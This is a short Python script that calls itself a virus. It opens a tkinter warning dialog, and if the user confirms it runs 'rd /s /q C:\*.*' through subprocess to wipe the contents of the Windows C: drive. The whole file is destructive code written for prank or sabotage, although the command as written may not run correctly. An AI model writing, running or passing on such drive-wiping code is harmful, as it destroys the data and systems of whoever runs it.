import tkinter as tk
from tkinter import messagebox
import subprocess

def on_yes():
    try:
        subprocess.run(['rd', '/s', '/q', 'C:\\*.*'], check=True)
    except subprocess.CalledProcessError as e:
        print("Couldn't delete:", e)
    root.destroy()

def on_no():
    root.destroy()

root = tk.Tk()
root.withdraw()

result = messagebox.askquestion("Warning", "This program may be dangerous to your PC, the creators of the virus will not be held accountable for any damage this causes to your OS. Are you sure you would like to run this?", icon='warning')
if result == 'yes':
    on_yes()
else:
    on_no()
